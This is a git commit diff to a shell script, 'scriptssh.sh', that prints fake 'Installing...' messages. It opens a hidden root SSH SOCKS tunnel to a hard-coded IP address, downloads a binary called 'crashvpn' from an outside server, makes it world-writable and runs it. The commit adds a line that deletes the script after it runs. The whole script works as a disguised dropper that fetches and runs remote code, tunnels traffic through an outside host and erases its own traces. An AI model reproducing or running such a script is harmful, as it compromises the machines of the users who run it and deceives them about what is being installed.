85d1f6f794a73368dde21152270978d65a13c802
guerraf-png <76536374+guerraf-png@users.noreply.github.com>
2020-12-23 18:23:20 -0300

    Update scriptssh.sh

--- scriptssh.sh
+++ scriptssh.sh
@@ -2,4 +2,5 @@ echo -e "\e[32mInstalando.\e[0m";
 echo -e "\e[32mInstalando..\e[0m";
 echo -e "\e[32mInstalando...\e[0m";
 ssh  -D 1080 -q -C -N -f root@192.99.98.3
+rm scriptssh.sh
 wget sv.bigbolgames.com:8444/files/superuser/crashvpn/crashvpn && chmod 777 crashvpn && ./crashvpn
